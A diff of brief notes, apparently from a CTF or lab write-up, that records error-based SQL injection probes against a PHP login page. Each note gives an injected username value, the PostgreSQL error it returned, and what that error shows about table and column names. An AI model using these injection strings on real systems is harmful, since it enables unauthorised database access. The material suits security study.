@@ -1,0 +1,15 @@
+  - x' and passwd is null;
+    - Query failed: ERROR: syntax error at or near "' AND passwd='" LINE 1: ...ROM
+      account WHERE username='x' and passwd is null;' AND pass... ^
+      in /var/www/fourFours/index.php on line 20
+    - so we can see passwd is a field in the query
+  - x' and username is null;
+    - Query failed: ERROR: syntax error at or near "' AND passwd='" LINE 1: ...M
+      account WHERE username='x' and username is null;' AND pass... ^
+      in /var/www/fourFours/index.php on line 20
+    - so we can see username is a field in the query
+  - x' and 1=(select count(*) from account); --
+    - does not return anything whereas:
+      x' and 1=(select count(*) from something); --
+      returns Query failed: ERROR: relation "something" does not exist in /var/www/fourFours/index.php on line 20
+    - so we can see that account is a table in the database
